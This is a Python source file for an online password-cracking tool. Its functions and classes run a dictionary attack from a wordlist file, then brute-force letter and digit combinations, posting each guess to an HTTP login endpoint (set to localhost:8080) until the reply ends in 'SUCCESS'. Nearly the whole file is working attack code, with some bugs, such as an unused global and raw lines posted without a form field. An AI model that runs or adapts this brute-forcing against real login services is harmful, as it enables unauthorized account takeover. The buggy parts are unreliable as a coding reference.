import requests, random, itertools

ENDPOINT = "http://localhost:8080/"

first_letters  = []
current_permutation = None
def set_characters_based_on_user(l, n):
    letters = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u",
               "v", "w", "x", "y", "z"]
    numbers = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0"]
    if l and n:
        print("ok")
        return letters+numbers
    elif l and not n:
        return letters
    elif n and not l:
        return numbers

    return False

def get_current_permuation():
    return current_permutation


def connect_to_endpoint(url):
    if requests.get(url).status_code == 200:
        return True

        # print(r.)
        # r.

def runAttack(first_letters, END_POINT,file):
    # run dict first
    found = dictionary_attack(file)
    # run brute if not found

    if not found:
        bruteforce_attack(first_letters)


def bruteforce_attack(first_letters):
    done = []
    for var in range(len(first_letters)):
        first_random_letter = first_letters[random.randint(0, len(first_letters) - 1)]
        # first_random_letter ="h"
        if first_random_letter not in done:
            print(first_random_letter)
            copy_first = first_letters.copy()
            copy_first[0] = first_letters[first_letters.index(first_random_letter)]
            copy_first[first_letters.index(first_random_letter)] = "a"
            for comb in itertools.product(copy_first, repeat=2):
                data = {'password': "".join(comb)}
                current_permutation ="".join(comb)
                r = requests.post(url=ENDPOINT, data=data)
                if r.content.decode("ascii").split("\n")[-1] == "SUCCESS":
                    print("done")
                    break
class DictionaryAttack:
    file = None
    combs = None
    end_point = None

    def __init__(self, file, end_point):
        self.file = file
        self.end_point = end_point
        filez = open(file[0], "r")
        nonempty_lines = [line.strip("\n") for line in filez if line != "\n"]
        self.combs = len(nonempty_lines)
        filez.close()

    def generate(self):
        with open(self.file[0], "r") as f:
            for line in f:
                yield line
    def attack(self, password):
        data = {'password': password}
        r = requests.post(url=self.end_point, data=data)
        if r.content.decode("ascii").split("\n")[-1] == "SUCCESS":
            print("done")



def dictionary_attack(file):
    found = False
    with open(file[0], "r") as f:
        for line in f:
            current_permutation = line
            r = requests.post(url=ENDPOINT, data=line)
            if r.content.decode("ascii").split("\n")[-1] == "SUCCESS":
                print("done")
                found = True
                break
            if 'str' in line:
                break

# defining the api-endpoint
# data to be sent to api


# sending post request and saving response as response object

# # extracting response text
# pastebin_url = r.text
# print("The pastebin URL is:%s" % pastebin_url)

class BruteForce:
    first_letters = None
    done = None
    pass_len = None
    end_point = None
    l = None
    n = None
    combs = None

    def __init__(self,l,n, password_len,end_point):
        self.first_letters = self.set_characters_based_on_user(l,n)
        print(self.first_letters)
        self.done = []
        self.pass_len = password_len
        self.end_point =  end_point
        self.l  =l
        self.n = n
        self.combs = self.calculateCombinations()
    def set_characters_based_on_user(self,l, n):
        letters = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t",
                   "u",
                   "v", "w", "x", "y", "z"]
        numbers = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0"]
        if l and n:
            print("ok")
            return letters + numbers
        elif l and not n:
            return letters
        elif n and not l:
            return numbers

        return False
    def generate(self):
        for var in range(len(self.first_letters)):
            first_random_letter = self.first_letters[random.randint(0, len(self.first_letters) - 1)]
            # first_random_letter ="h"
            if not not self.l and self.n:
                if first_random_letter not in self.done:
                    # print(first_random_letter)
                    copy_first = self.first_letters.copy()
                    copy_first[0] = self.first_letters[self.first_letters.index(first_random_letter)]
                    copy_first[self.first_letters.index(first_random_letter)] = "a"
                    for comb in itertools.product(copy_first, repeat=self.pass_len):
                        # print("".join(comb))
                        yield "".join(comb)
            else:
                for comb in itertools.product(self.first_letters, repeat=self.pass_len):
                    # print("".join(comb))
                    yield "".join(comb)

        return False

    def attack(self, password):
        data = {'password': password}
        r = requests.post(url=self.end_point, data=data)
        if r.content.decode("ascii").split("\n")[-1] == "SUCCESS":
            print("done")

    def calculateCombinations(self):
        if self.l and self.n:
                return 36**self.pass_len
        elif self.l and  not self.n:
            return  26**self.pass_len
        elif not self.l and self.n:
            return 10**self.pass_len




